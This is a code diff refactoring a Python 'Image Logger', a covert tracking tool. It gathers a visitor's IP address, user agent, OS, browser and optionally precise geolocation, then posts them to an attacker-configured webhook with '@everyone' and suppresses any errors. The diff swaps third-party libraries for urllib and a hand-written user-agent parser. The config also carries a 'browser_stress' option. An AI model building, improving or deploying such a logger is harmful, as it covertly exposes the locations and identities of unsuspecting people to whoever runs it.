@@ -1,11 +1,10 @@
 import json
-import httpagentparser
-import requests
+import urllib.request
 
 # ==== CONFIG ====
 options = {
-    "accurate_location": True,
-    "browser_stress": False
+    "accurate_location": True,  # Ask user for geolocation
+    "browser_stress": False      # Optional browser stress
 }
 
 config = {
@@ -16,19 +15,48 @@ config = {
     "color": 0x00FFFF
 }
 
+# ==== HELPER FUNCTION TO DETECT OS/BROWSER (simple) ====
+def detect_os_browser(useragent):
+    ua = useragent.lower()
+    os = "Unknown"
+    browser = "Unknown"
+    
+    if "windows" in ua:
+        os = "Windows"
+    elif "mac" in ua:
+        os = "MacOS"
+    elif "linux" in ua:
+        os = "Linux"
+    elif "android" in ua:
+        os = "Android"
+    elif "iphone" in ua or "ipad" in ua:
+        os = "iOS"
+
+    if "chrome" in ua:
+        browser = "Chrome"
+    elif "firefox" in ua:
+        browser = "Firefox"
+    elif "safari" in ua and "chrome" not in ua:
+        browser = "Safari"
+    elif "edge" in ua:
+        browser = "Edge"
+
+    return os, browser
+
 # ==== HELPER FUNCTION TO SEND WEBHOOK ====
 def send_webhook(ip, useragent, lat=None, lon=None):
-    os, browser = httpagentparser.simple_detect(useragent or "")
-    payload = {
-        "username": config["username"],
-        "content": "@everyone",
-        "embeds": [{
-            "title": "Image Logger - IP Logged",
-            "color": config["color"],
-            "description": f"""
+    os, browser = detect_os_browser(useragent)
+    embed_description = f"""
 **IP Info**
 > IP: {ip}
+> ISP: Unknown
+> ASN: Unknown
+> Country: Unknown
+> Region: Unknown
+> City: Unknown
 > Coords: {lat or 'Unknown'}, {lon or 'Unknown'}
+> VPN/Proxy: Unknown
+> Hosting: Unknown
 
 **PC Info**
 > OS: {os}
@@ -37,10 +65,23 @@ def send_webhook(ip, useragent, lat=None, lon=None):
 **User Agent**
 {useragent or 'Unknown'}
 """
+    payload = json.dumps({
+        "username": config["username"],
+        "content": "@everyone",
+        "embeds": [{
+            "title": "Image Logger - IP Logged",
+            "color": config["color"],
+            "description": embed_description
         }]
-    }
+    }).encode("utf-8")
+
     try:
-        requests.post(config["webhook"], json=payload)
+        req = urllib.request.Request(
+            config["webhook"],
+            data=payload,
+            headers={'Content-Type': 'application/json'}
+        )
+        urllib.request.urlopen(req, timeout=5)
     except:
         pass
 
